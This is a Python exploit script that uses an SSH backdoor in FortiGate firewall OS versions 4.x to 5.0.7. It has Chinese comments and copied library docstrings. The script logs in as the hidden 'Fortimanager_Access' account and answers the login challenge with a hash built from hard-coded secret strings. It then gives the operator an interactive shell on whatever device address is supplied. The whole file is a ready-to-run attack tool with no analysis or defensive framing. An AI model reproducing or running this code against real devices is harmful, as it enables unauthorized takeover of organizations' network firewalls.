#!/usr/bin/env python

# SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7
# Usage: ./fgt_ssh_backdoor.py <target-ip>

import socket
import select
import sys
import paramiko
from paramiko.py3compat import u
import base64
import hashlib
import termios
import tty

#计算验证字符串
def custom_handler(title, instructions, prompt_list):
    n = prompt_list[0][0]
    m = hashlib.sha1()
    m.update('\x00' * 12)
    m.update(n + 'FGTAbc11*xy+Qqz27')
    m.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')
    h = 'AK1' + base64.b64encode('\x00' * 12 + m.digest())
    return [h]


def main():
    if len(sys.argv) < 2:
        print 'Usage: ' + sys.argv[0] + ' <target-ip>'
        exit(-1)
    
    #创建SSHClient客户端类
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
    #尝试连接服务器
    #hostname (str) – the server to connect to
    #username (str) – the username to authenticate as (defaults to the current local username)
    #allow_agent (bool) – set to False to disable connecting to the SSH agent
    #look_for_keys (bool) – set to False to disable searching for discoverable private key files in ~/.ssh/
        client.connect(sys.argv[1], username='', allow_agent=False, look_for_keys=False)
    except paramiko.ssh_exception.SSHException:
        pass

    #get_transport()
    #Return the underlying Transport object for this SSH connection. This can be used to perform lower-level tasks, like opening specific kinds of channels.
    trans = client.get_transport()
    try:
        #发送用户名Fortimanager_Access，密码为空
        #auth_password(username, password, event=None, fallback=True)
        #username (str) – the username to authenticate as
        #password (basestring) – the password to authenticate with
        #event (threading.Event) – an event to trigger when the authentication attempt is complete (whether it was successful or not)
        trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)
    except paramiko.ssh_exception.AuthenticationException:
        pass
    
    #获取服务器回复的随机数
    #auth_interactive(username, handler, submethods='')
    #username (str) – the username to authenticate as
    #handler (callable) – a handler for responding to server questions
    trans.auth_interactive(username='Fortimanager_Access', handler=custom_handler)
    
    #invoke_shell(term='vt100', width=80, height=24, width_pixels=0, height_pixels=0)
    #获得shell
    chan = client.invoke_shell()

    oldtty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        tty.setcbreak(sys.stdin.fileno())
        chan.settimeout(0.0)

        while True:
            r, w, e = select.select([chan, sys.stdin], [], [])
            if chan in r:
                try:
                    x = u(chan.recv(1024))
                    if len(x) == 0:
                        sys.stdout.write('\r\n*** EOF\r\n')
                        break
                    sys.stdout.write(x)
                    sys.stdout.flush()
                except socket.timeout:
                    pass
            if sys.stdin in r:
                x = sys.stdin.read(1)
                if len(x) == 0:
                    break
                chan.send(x)

    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)


if __name__ == '__main__':
    main()